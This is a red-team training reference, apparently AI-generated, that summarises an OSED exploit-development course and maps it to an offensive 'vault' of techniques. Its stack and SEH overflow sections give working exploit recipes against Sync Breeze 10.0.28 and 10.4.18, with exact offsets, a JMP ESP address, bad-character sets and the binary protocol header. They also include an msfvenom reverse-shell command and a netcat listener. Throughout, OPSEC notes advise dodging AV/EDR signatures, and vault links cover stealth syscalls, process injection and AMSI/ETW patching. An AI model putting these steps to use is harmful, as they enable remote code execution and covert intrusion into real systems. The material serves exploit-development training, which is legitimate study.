---
id: RTO-osed-exploit-dev-foundations
name: OSED Exploit Development Foundations — WinDbg, Stack Overflows, SEH
source: OffSec EXP-301 (OSED) / shared by Tamarisk
category: exploit-development
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-001, T-003, T-005, T-007, T-013, T-016, T-020, T-021]
tags: [exploit-development, windbg, x86, stack-overflow, seh, shellcode, dep, aslr, cfg, safeseh, rop, pe-parsing, hardware-breakpoints, bad-chars, msfvenom, shikata_ga_nai, eip-control, jmp-esp, pop-pop-ret, sync-breeze]
---

# OSED Exploit Development Foundations — Training Reference

## TL;DR
This OSED module covers the foundational tradecraft for Windows user-mode exploit development on x86: WinDbg mastery (memory/registers/breakpoints/structures), stack overflow exploitation against Sync Breeze 10.0.28 (EIP control via JMP ESP + shikata_ga_nai shellcode), and SEH overflows against Sync Breeze 10.4.18 (P/P/R + SafeSEH/SEHOP theory). It complements the vault by providing the *vulnerability discovery + weaponization* foundation that the vault's *post-exploitation tradecraft* (syscalls, injection, evasion) builds on top of.

## Key Concepts

1. **x86 Process Memory Model & Stack Frame Layout**
   - Process memory spans 0x00000000–0x7FFFFFFF (user-mode) on x86. Stack grows down (high→low). Stack frame holds return address, saved EBP, args, locals.
   - Calling convention determines arg passing/cleanup. Win32 APIs use `__stdcall` (right-to-left push, callee cleans). Vault operators encounter the same layout in T-005 (Ekko ROP) frame construction and T-009 stack spoofing.

2. **CPU Registers (EAX/EBX/ECX/EDX/ESI/EDI/ESP/EBP/EIP)**
   - 9 GPRs on x86. EIP = instruction pointer (primary attacker target). ESP = stack top. EBP = frame base. Subregisters (AX/AH/AL, etc.) allow 16/8-bit access.
   - Direct cross-ref to T-003 (VEH Gate) which manipulates EIP via debug-register-triggered exception dispatch.

3. **WinDbg as User-Mode Debugger**
   - Standard WinDbg (not Preview) used for compatibility. Attaches via `File → Attach to a Process` or F6. Injects INT 3 (0xCC) for software breakpoints. Symbol path: `C:\symbols`, force load with `.reload /f`.

4. **PE Format & Mitigation Inspection**
   - Walk `IMAGE_DOS_HEADER` → `e_lfanew` (offset 0x3C) → `IMAGE_NT_HEADERS` → `IMAGE_OPTIONAL_HEADER.DllCharacteristics` (offset 0x46).
   - DllCharacteristics bits encode: `IMAGE_DLLCHARACTERISTICS_NO_SEH` (SafeSEH off), `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` (ASLR), `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` (DEP), `IMAGE_DLLCHARACTERISTICS_GUARD_CF` (CFG).
   - Direct cross-ref to T-007 (Process Injection) which parses PE headers for injection; T-016 (EDR Evasion) which toggles ACG/CFG policies.

5. **Stack Overflow Mechanics**
   - C `strcpy`/`memcpy` without bounds check → linear overwrite of locals → saved EBP → return address. On `ret`, overwritten address loaded into EIP.
   - Pattern: 780-byte filler → 4-byte EIP control → offset → shellcode. Little-endian byte order for addresses in payload.

6. **Structured Exception Handling (SEH) Chain**
   - `_NT_TIB.ExceptionList` (offset 0x0 in TEB, accessed via `fs:[0]`) → singly-linked list of `_EXCEPTION_REGISTRATION_RECORD{Next, Handler}`.
   - On exception: `ntdll!KiUserExceptionDispatcher` → `RtlDispatchException` walks list, calls `ntdll!ExecuteHandler2` → `call ecx` invokes `Handler`.
   - End of chain marked by `Next = 0xFFFFFFFF` (final/default handler).

7. **SEH Overflow & SafeSEH/SEHOP**
   - Overflow corrupts `_EXCEPTION_REGISTRATION_RECORD` (Next+Handler). When exception fires (often induced by overflow itself), control reaches attacker via `call ecx` (Handler ptr).
   - SafeSEH: linker emits table of valid handlers; `RtlIsValidHandler` validates. SEHOP: validates `Next` chain integrity before dispatch.
   - Bypass: target module compiled *without* `/SAFESEH` (DllCharacteristics bit 0 → unmanaged); use P/P/R gadget in non-SafeSEH module.

8. **ROP Gadget Discovery & Mitigation Awareness**
   - JMP ESP search via opcode `0xFF 0xE4` (NASM: `msf-nasm_shell` then `jmp esp`). P/P/R sequence: search for `0x5B 0x5B 0xC3` variants or pattern_scan.
   - DEP/ASLR/CFG/SafeSEH/SEHOP/GS each addressed conceptually. DEP bypass via ROP covered in later modules (referenced).

9. **Hardware (Debug Register) Breakpoints**
   - `ba e|r|w <size> <addr>` — uses DR0–DR3 (4 max). Triggers on access type/size. Critical for data-flow tracking (e.g., finding what writes a buffer).
   - Direct cross-ref to T-003 (VEH Syscall Gate): the vault's HW breakpoint mediated syscall dispatch is the *same* debug-register mechanism, repurposed for stealth syscall execution.

10. **Shellcode Generation & Encoding**
    - `msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -f c` produces raw payload (~324 bytes).
    - Bad chars (`-b "\x00\x0a\x0d\x25\x26\x2b\x3d"`) → `shikata_ga_nai` encoder prepends GetPC decoder stub.
    - GetPC side-effect (writes near ESP) requires NOP sled (`0x90` × 8–16) or explicit `SUB ESP, 0xXX`.
    - `EXITFUNC=thread` for graceful exit (ExitThread vs ExitProcess).
    - Cross-ref to T-021 (Crypto & Obfuscation): vault has its own shellcode encoding schemes (IPv4/IPv6/MAC/UUID/words) that supersede msfvenom for C2 beacons; shikata_ga_nai still relevant for stage-0 payloads.

11. **Sync Breeze Target Specifics**
    - v10.0.28: HTTP POST `/login`, username field overflow, offset 780, JMP ESP in `libspp.dll` at `0x10090c83`, no DEP/ASLR/CFG.
    - v10.4.18: Custom binary protocol on port 9121, header `0x75 0x19 0xba 0xab` + length fields, SEH overflow at offset 128, full chain visible via `!exchain`.

## Operational Techniques

### WinDbg Memory & Register Manipulation
- **What**: Operator-level WinDbg command suite for inspecting/editing memory, registers, structures, and execution flow.
- **When to use**: Any reverse engineering, exploit dev, or post-exploitation debugging task. Essential for validating payloads before deployment.
- **How**:
  - Disassemble: `u <addr|symbol>` (e.g., `u kernel32!GetCurrentThread`)
  - Display memory: `db` (bytes), `dw` (words), `dd` (dwords), `dq` (qwords), `da` (ASCII), `du` (Unicode), `dW` (words+ASCII), `dc` (dwords+ASCII)
  - Pointer deref: `dd poi(esp)` — emulates `**esp`
  - Limit length: `dd esp L4`
  - Dump structure: `dt ntdll!_TEB @$teb` (recursive with `-r`)
  - Structure size: `?? sizeof(ntdll!_TEB)`
  - Edit memory: `ed esp 41414141`, `ea esp "Hello"`, `eu esp "Unicode"`
  - Inspect/edit registers: `r`, `r ecx`, `r ecx=41414141`
  - Search memory: `s -d 0 L?80000000 41414141` (DWORD), `s -a 0 L?80000000 "string"`, `s -b <start> <end> 0xff 0xe4`
- **Vault link**: T-020 (Anti-Analysis) — the vault's `evade_vm` and diagnostic harnesses use equivalent memory introspection; WinDbg workflow directly supports T-003 (VEH Gate) debugging when exceptions don't dispatch as expected.
- **Tool/code**:
  - Symbol path: `C:\symbols` (configure via `File → Symbol File Path`)
  - Reload: `.reload /f`; noisy: `!sym noisy`
  - List modules: `lm`, filter `lm m kernel*`
  - List symbols: `x kernelbase!CreateProc*`
  - Calculator: `? 77269bc0 - 77231430`, `? 77269bc0 >> 18`
  - Format conversion: `0n` (decimal), `0y` (binary), `.formats 41414141`
  - Pseudo-registers: `@$teb`, `@$peb`, `@$t0`–`@$t19` (user-defined, prefix with `@`)
  - Built-in manual: `.hh <command>`
- **OPSEC**: WinDbg attached to a target raises PEB `BeingDebugged` flag (visible at TEB+0x30 → PEB+0x2). Vault T-020 explicitly enumerates this check. Detach cleanly with `qd` (detach) or `q` (kill).

### Breakpoint Variants
- **What**: Software (`bp`/`bu`), conditional (`bp ... ".if {...} .else {...}"`), hardware (`ba`) breakpoint orchestration.
- **When to use**: Halt at API entry (bp), on dynamic module load (bu), on data write (ba w), conditional halt on specific arg value.
- **How**:
  - Software: `bp kernel32!WriteFile` — overwrites first opcode with 0xCC INT 3
  - Unresolved (deferred): `bu ole32!WriteStringStream` — resolves on module load; track via `lm m ole32`
  - Conditional with printf: `bp kernel32!WriteFile ".printf \"bytes written: %p\", poi(esp+0x0C); .echo; g"` (third arg = nNumberOfBytesToWrite in `__stdcall`)
  - Conditional break: `bp kernel32!WriteFile ".if (poi(esp+0x0C) != 4) {gc} .else {.printf \"4 bytes\";.echo}"`
  - Hardware execute: `ba e 1 kernel32!WriteFile`
  - Hardware write: `ba w 2 03b2c768` (write-watch on 2-byte region)
  - Manage: `bl` (list), `bd N` (disable), `be N` (enable), `bc N` (clear), `bc *` (clear all)
  - Conditional resume: `gc` (go from conditional breakpoint)
- **Vault link**: T-003 (VEH Gate) — vault exploits `ba`-style HW breakpoints to dispatch syscalls via exception handler. Understanding `ba` semantics here is prerequisite for understanding why VEH Gate is OPSEC-clean (no patching, no INT 3 in target).
- **Tool/code**: NASM opcode lookup — `msf-nasm_shell` then `jmp esp` → `0xFF 0xE4`.
- **OPSEC**: Software breakpoints leave 0xCC bytes in target memory; EDR can scan for these. For covert ops, prefer HW breakpoints (limited to 4, but no memory modification). Vault T-003 rationale is exactly this.

### Execution Stepping
- **What**: Single-step / step-over / step-to-return / step-to-branch primitives.
- **When to use**: Tracing call chains, validating shellcode execution path, following ROP dispatch.
- **How**:
  - `p` — step over (don't descend into `call`)
  - `t` — step into (descend)
  - `pt` — execute until next `ret` (function end)
  - `ph` — execute until branch (call/ret/jcc)
  - `g` — continue execution
- **Vault link**: T-005 (Ekko ROP Sleep) — the vault's 6-frame ROP chain requires precise stepping validation; `pt` is essential for verifying each ROP gadget dispatches cleanly.
- **OPSEC**: Stepping generates debug events; not for live engagement, only offline dev.

### Stack Overflow Exploitation (Sync Breeze v10.0.28)
- **What**: End-to-end HTTP POST buffer overflow → SYSTEM reverse shell.
- **When to use**: Reference pattern for any x86 stack overflow without modern mitigations.
- **How**:
  1. Trigger crash: 800-byte A buffer in `username=` field of `POST /login`
  2. Find EIP offset: `msf-pattern_create -l 800` → send → read EIP (e.g., `42306142` = "B0aB") → `msf-pattern_offset -l 800 -q 42306142` → 780
  3. Confirm: 780×A + 4×B + 16×C → EIP = 0x42424242
  4. Find shellcode space: ESP points to buffer after EIP overwrite; extend payload to 1500 bytes → 712 bytes available
  5. Bad chars: send 0x01–0xFF after offset; inspect via `db esp L20`; iterate removal. Result for Sync Breeze: `\x00\x0a\x0d\x25\x26\x2b\x3d`
  6. Find JMP ESP: check `IMAGE_OPTIONAL_HEADER.DllCharacteristics` for each module (Process Hacker or manual `dt`); target = non-ASLR/non-DEP module without bad chars in address range → `libspp.dll` (0x10000000–0x10223000)
  7. Opcode search: `msf-nasm_shell` → `jmp esp` → `0xFF 0xE4` → `s -b 10000000 10223000 0xff 0xe4` → `0x10090c83`
  8. Verify: `u 10090c83` → `jmp esp`; `bp 10090c83`, `g`, then `t` to step into shellcode
  9. Generate shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"` → 351 bytes
  10. Add NOP sled (10×0x90) before shellcode to dodge GetPC stub self-corruption
  11. Final layout: `A×780 + JMP_ESP(LE) + C×4 + NOP×10 + shellcode + padding to 1500`
  12. Listener: `sudo nc -lvp 443`
- **Vault link**: T-021 (Crypto & Obfuscation) — vault's own shellcode encoding (IPv4/IPv6/MAC/UUID/words) is for beacon payloads in C2; the OSED shikata_ga_nai flow is the canonical stage-0 encoder when only a single overflow primitive is available. T-007 (Process Injection) PE header parsing reuses the IMAGE_DOS_HEADER → NT_HEADERS walk taught here.
- **Tool/code**:
  - `msf-pattern_create -l 800`
  - `msf-pattern_offset -l 800 -q <hex>`
  - `msf-nasm_shell` → `jmp esp`
  - `msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=y EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
  - Process Hacker 2.39 (x86): `C:\Tools\processhacker-2.39-bin\x86\ProcessHacker.exe`
- **OPSEC**: ExitProcess (default) crashes service — use `EXITFUNC=thread` to keep service alive for repeat exploitation. NOP sled slightly increases AV detection signature; prefer tight landing or `SUB ESP, 0xXX` sled.

### SEH Overflow Exploitation (Sync Breeze v10.4.18)
- **What**: SEH chain corruption → P/P/R dispatch → shellcode via EstablisherFrame.
- **When to use**: When vanilla ret overwrite is impossible (no return-address control) but SEH chain is reachable. Common when overflow is in a callback/deserializer (not a leaf function).
- **How**:
  1. Trigger crash: custom binary protocol header `\x75\x19\xba\xab\x03\x00\x00\x00\x00\x40\x00\x00 + pack('<I', len) + pack('<I', last_byte)` + 1000×A → port 9121
  2. Initial crash in `libpal!SCA_ConfigObj::Deserialize+0x1d` (`call dword ptr [eax+24h]`) — EAX controlled, EIP not yet
  3. Pass to first-chance handler: `g` → EIP = 0x41414141 (handler invoked via `ntdll!ExecuteHandler2` `call ecx`)
  4. Inspect chain: `!exchain` → see corrupted `_EXCEPTION_REGISTRATION_RECORD`
  5. Trace dispatch: `bp ntdll!ExecuteHandler2` → step through `push ebp; mov ebp,esp; push [ebp+0Ch]; push edx; push fs:[0]; mov fs:[0],esp; push args; call ecx` — confirms `call ecx` invokes our Handler ptr
  6. Find SEH offset: `msf-pattern_create -l 1000` → `msf-pattern_offset -l 1000 -q <handler_val>` → **128 bytes**
  7. Confirm: 128×A + 4×B(Handler) + 4×C(Next) + padding → `!exchain` shows `42424242` as handler
  8. Bad chars: same iteration as stack overflow; for Sync Breeze v10.4.18 result is similar (`\x00\x0a\x0d` plus a few)
  9. Find P/P/R gadget: search non-SafeSEH module for `POP R32; POP R32; RET` (e.g., `0x5B 0x5B 0xC3` for `pop ebx; pop ebx; ret`, or `0x58 0x58 0xC3`, `0x5D 0x5D 0xC2 XX 00`)
  10. Layout: `A×128 + PPR_addr(LE) + B×4(jmp_offset) + NOP×8 + shellcode`
  11. `B×4` = relative offset to NOP sled (typically `\xEB\x06\x90\x90` = `jmp short $+8`)
  12. Shellcode: same msfvenom pipeline as stack overflow
- **Vault link**: T-003 (VEH Gate) — same `_EXCEPTION_REGISTRATION_RECORD` chain the vault abuses for HW-breakpoint-mediated syscall dispatch. Understanding the SEH walk here is prerequisite to understanding why VEH-registered handlers fire deterministically in T-003.
- **Tool/code**:
  - `!exchain` — list current thread SEH chain
  - `!teb` — dump TEB (shows `ExceptionList`, `StackBase`, `StackLimit`)
  - `dt _EXCEPTION_REGISTRATION_RECORD <addr>` — walk chain manually
  - `dt ntdll!_CONTEXT` — register snapshot at exception
  - `dt ntdll!_EXCEPTION_DISPOSITION` — handler return values (ExceptionContinueExecution=0, ExceptionContinueSearch=1, etc.)
- **OPSEC**: P/P/R gadget must come from non-SafeSEH module. On modern Windows, most system DLLs have SafeSEH — operators often pivot to bundled third-party DLLs or compiled-without-flags executables. SEHOP (default on Server SKUs) blocks this entirely; consider SEHOP-disabled targets or pivot to VEH (vault T-003).

### PE Header Mitigation Inspection
- **What**: Manual walk of PE header to read `DllCharacteristics` for exploit feasibility check.
- **When to use**: Quick triage of any in-scope binary — does it have DEP/ASLR/CFG/SafeSEH?
- **How**:
  ```
  0:008> lm m syncbrs                    # get base
  0:008> dt ntdll!_IMAGE_DOS_HEADER 0x00400000
  ... +0x03c e_lfanew : 0n232           # offset to PE header
  0:008> dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
  ... +0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER
  0:008> dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18
  ... +0x046 DllCharacteristics : 0x0    # no mitigations
  ```
  Or: Process Hacker → process → Modules tab → double-click module → Mitigation flags.
- **Vault link**: T-016 (EDR Evasion Suite) — vault's `policy` module (Block-DLL, ACG) and PE stomping (`pe_header_stomp`) require the same PE header fluency.
- **Tool/code**: `lm m <module>`, `dt ntdll!_IMAGE_*`, Process Hacker.
- **OPSEC**: PE header reads are passive (no modification); safe during engagement recon.

### Bad Character Detection
- **What**: Iterative elimination of bytes that mangle the payload in transit (parser/transport layer).
- **When to use**: Every stack/SEH/heap overflow with string-copy or protocol parsing in the vuln path.
- **How**:
  1. Build byte array `\x01\x02...\xff` (exclude `\x00`)
  2. Append to filler+eip placeholder
  3. Crash target, attach WinDbg, `db esp L20` (or wherever payload lands)
  4. Identify first mangled byte; remove; re-send; repeat
  5. Common culprits: `\x00` (null/string terminator), `\x0a` (LF), `\x0d` (CR), `\x25` (%), `\x26` (&), `\x2b` (+), `\x3d` (=) — all URL/form-encoded special chars
- **Vault link**: T-021 (Crypto & Obfuscation) — vault's shellcode encoders (IPv4/IPv6/MAC/UUID) exist *because* of bad char constraints; UUID encoding specifically defeats byte-restriction parsers. If shikata_ga_nai can't avoid bad chars, consider vault's UUID/MAC encoders as transport-stage alternatives.
- **OPSEC**: Always re-verify after each iteration — removing one bad char can unmask another. Document the final char set in the exploit's header.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `WinDbg` (x86) | User/kernel-mode debugger; primary tool | Raises `BeingDebugged` flag — detect via PEB+0x2; T-020 anti-VM suite checks this |
| `WinDbg Preview` | Modern UI + Time Travel Debugging + JS scripting | Win10 1607+ only; course uses standard for compatibility |
| `Process Hacker 2.39` | Module mitigation inspection (DEP/ASLR/CFG/ACG) | Passive read; safe during recon |
| `msf-pattern_create -l N` | Non-repeating pattern for EIP offset discovery | Sends identifiable bytes — fine for dev, never in prod payload |
| `msf-pattern_offset -l N -q HEX` | Match EIP value to offset | — |
| `msf-nasm_shell` | Assembly ↔ opcode translation | — |
| `msfvenom -p windows/shell_reverse_tcp ...` | Shellcode generation | Default ExitProcess kills service; use `EXITFUNC=thread` |
| `msfvenom -e x86/shikata_ga_nai -b "..."` | Polymorphic XOR encoder for bad char avoidance | GetPC stub writes near ESP — needs NOP sled or `SUB ESP` |
| `nc -lvp 443` | Reverse shell listener | Plain TCP; for engagements use vault T-022 malleable C2 or HTTP poll |
| `u <addr>` | Disassemble memory | — |
| `db/dw/dd/dq/da/du/dW/dc <addr> L<N>` | Display memory in various widths/encodings | — |
| `dt <type> <addr>` | Dump structure with symbol info | Recursive with `-r` |
| `?? sizeof(<type>)` | Structure size in bytes | — |
| `r <reg>` / `r <reg>=<val>` | Inspect/modify register | — |
| `ed/ea/eu <addr> <val>` | Edit dword/ASCII/Unicode at addr | — |
| `s -<fmt> <start> L<len> <pattern>` | Search memory; `?` for whole user space | — |
| `poi(<addr>)` | Pointer dereference in expressions | — |
| `bp/bu/ba/bc/bd/be/bl` | Software/unresolved/hardware breakpoints + mgmt | SW breakpoints leave 0xCC; HW limited to 4 |
| `p/t/pt/ph` | Step over/into/to-ret/to-branch | — |
| `g` / `gc` | Continue / continue from conditional bp | — |
| `lm m <pattern>` | List modules filtered by pattern | — |
| `x <module>!<symbol*>` | Examine symbols by pattern | — |
| `?<expr>` | Evaluate expression (calculator) | — |
| `0n/0y` | Decimal/binary input prefix | — |
| `.formats <val>` | Show value in all formats (hex/dec/bin/ASCII) | — |
| `@$teb/@$peb/@$t0-$t19` | Pseudo-registers for scripting | — |
| `.hh <cmd>` | Built-in manual | — |
| `!teb` | Dump TEB | — |
| `!exchain` | Dump SEH chain | — |
| `.reload /f` | Force symbol reload | Set `C:\symbols` path first |
| `!sym noisy` | Verbose symbol loading diagnostics | — |

## Gaps & Extensions

### What the vault covers that this training doesn't
- **Modern exploit mitigations bypass**: The vault's T-005 (Ekko ROP Sleep) implements a full 6-frame ROP chain for sleep obfuscation — OSED only *references* ROP conceptually (full ROP/DEP bypass is in a later OSED module not included here). Vault is ahead on ROP-as-evasion.
- **Indirect syscall dispatch**: OSED doesn't cover syscall-level evasion at all. Vault T-001 (RecycledGate), T-002 (Hell's/Halo's/Tartarus Gate), T-003 (VEH Gate) are entirely post-OSED tradecraft.
- **Process injection & memory stealth**: OSED ends at shellcode execution in-process; vault T-007 through T-015 cover 15 injection methods including the modern research-grade ones (Pool Party, Threadless, Early Cascade).
- **EDR evasion suite**: OSED predates EDR-as-product. Vault T-016 covers AMSI/ETW patching, stack spoofing, PEB unlink, NTDLL unhook, ACG, handle blocking — none addressed in OSED.
- **Modern shellcode encoding**: Vault T-021 has IPv4/IPv6/MAC/UUID/word encoders that are subtler than shikata_ga_nai (which OSED uses).
- **Hardware breakpoints for offense**: Vault T-003 uses HW breakpoints (the same DR0-DR3 mechanism OSED teaches for `ba`) for *stealth syscall dispatch*, not just data-write tracking. OSED's HW breakpoint coverage is purely defensive-debugging oriented.

### What this training covers that the vault doesn't
- **Vulnerability discovery → weaponization pipeline**: The vault assumes you have a payload; OSED teaches the *full chain from crash PoC to working SYSTEM shell*. This is foundational and not duplicated in the vault.
- **Structured Exception Handling deep dive**: Vault T-003 uses VEH (vectored) handlers but doesn't document the SEH chain (`_EXCEPTION_REGISTRATION_RECORD`, `KiUserExceptionDispatcher`, `ExecuteHandler2`, `RtlIsValidHandler`, SafeSEH/SEHOP). OSED is the canonical reference for this.
- **Bad character methodology**: The vault's shellcode encoders *solve* the bad char problem; OSED teaches how to *discover* the bad char set for a given transport — essential first step before choosing an encoder.
- **PE mitigation triage**: OSED's manual `IMAGE_DOS_HEADER` → `IMAGE_NT_HEADERS` → `IMAGE_OPTIONAL_HEADER.DllCharacteristics` walk is more thorough than the vault's implicit PE handling.
- **msfvenom operational fluency**: The vault generates payloads in Rust; OSED grounds operators in msfvenom as a baseline tool.
- **Sync Breeze reference target**: A documented, repeatable exploit dev sandbox (Sync Breeze v10.0.28 and v10.4.18) — useful for operators validating new tooling against a known-vulnerable baseline.

### Areas where OSED is outdated / superseded
- **MSFvenom as primary payload generator**: For modern engagements, prefer custom stage-0 payloads (vault T-022 multi-chain vault, T-021 crypto pipeline) — MSFvenom signatures are well-known to EDR.
- **shikata_ga_nai encoder**: Heavily signatured by AV/EDR. Use vault T-021 UUID/MAC encoders or custom schemes for production.
- **ExitProcess/ExitThread shellcode exit**: Modern beacons use process injection + thread hijack for cleaner teardown (vault T-007 Pool Party, T-008 Threadless).
- **WinDbg standard over Preview**: WinDbg Preview's Time Travel Debugging is now industry standard for exploit dev; OSED's choice of standard WinDbg is purely for backward compatibility.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| Stack overflow EIP control via JMP ESP gadget | T-001 RecycledGate | Both rely on gadget discovery in loaded modules; JMP ESP is the simplest case, RecycledGate generalizes to indirect syscall gadgets |
| Hardware breakpoints (`ba e/r/w`) | T-003 VEH Syscall Gate | Identical debug-register mechanism (DR0-DR3); vault repurposes for stealth syscall dispatch via exception handler |
| ROP gadget search (NASM opcodes) | T-005 Ekko ROP Sleep | OSED introduces ROP conceptually; vault implements full 6-frame ROP for PE encryption during sleep |
| PE header walk (IMAGE_DOS_HEADER → NT_HEADERS → OPTIONAL_HEADER) | T-007 Process Injection | Vault's `pe.rs` parser uses identical walk for injection target validation |
| SafeSEH / SEHOP mitigation awareness | T-003 VEH Gate | Vault's VEH approach sidesteps SEH entirely (VEH is process-wide, no chain validation); understanding SEH is prerequisite to appreciating why VEH is OPSEC-preferred |
| `ntdll!KiUserExceptionDispatcher` dispatch flow | T-003 VEH Gate | Same dispatcher invokes VEH list before SEH; OSED's SEH dispatch trace is the prerequisite knowledge |
| CONTEXT structure (EIP/ESP/EBP at exception) | T-003 VEH Gate | Vault manipulates CONTEXT to redirect syscall execution; OSED's `dt ntdll!_CONTEXT` is the canonical reference |
| shikata_ga_nai shellcode encoding | T-021 Crypto & Obfuscation | OSED teaches the baseline; vault supersedes with IPv4/IPv6/MAC/UUID/word encoders for C2 beacon transport |
| Bad character discovery methodology | T-021 Crypto & Obfuscation | Vault's encoders *consume* the bad char set OSED's methodology *produces*; complementary |
| DEP/ASLR/CFG/SafeSEH/SEHOP/GS mitigation matrix | T-016 EDR Evasion Suite | Vault manipulates ACG/CFG policies at runtime; OSED provides the conceptual foundation for what these mean |
| PEB `BeingDebugged` flag (visible in `dt _TEB` output) | T-020 Anti-Analysis Suite | Vault's `evade_vm` checks this exact field; OSED reveals it via TEB dump |
| JMP ESP gadget in non-ASLR module | T-013 Remaining Injection (Module/Func Stomp) | Both require a stable, non-ASLR'd MEM_IMAGE backing; vault generalizes via PE stomping |
| msfvenom `EXITFUNC=thread` for service survival | T-007 Early Cascade / T-008 Threadless | Vault's injection primitives are the modern equivalent — thread-level execution without process-level exit concerns |
| `msf-pattern_create/offset` for EIP discovery | (no direct equivalent) | Vault assumes payload already targets correct offset; OSED's pattern tooling is unique |
| `!exchain` / `!teb` / `dt _EXCEPTION_REGISTRATION_RECORD` | T-003 VEH Gate | Vault's VEH debugging requires identical WinDbg structure-inspection fluency |
| Sync Breeze v10.0.28 stack overflow reference | (no equivalent) | Unique dev sandbox; vault operators can use as validation target for new injection primitives |
| Custom binary protocol header reverse engineering (Sync Breeze v10.4.18) | T-022 Network Suite | Vault's malleable C2 / protocol design is the inverse problem (crafting vs. reversing); OSED provides the reversing lens |
| WinDbg `ba w` data-write tracking | T-016 EDR Evasion (stack spoofing) | Both manipulate stack state; HW breakpoint tracking is the diagnostic step before stack spoofing implementation |

---

**End of Reference Document — RTO-osed-exploit-dev-foundations**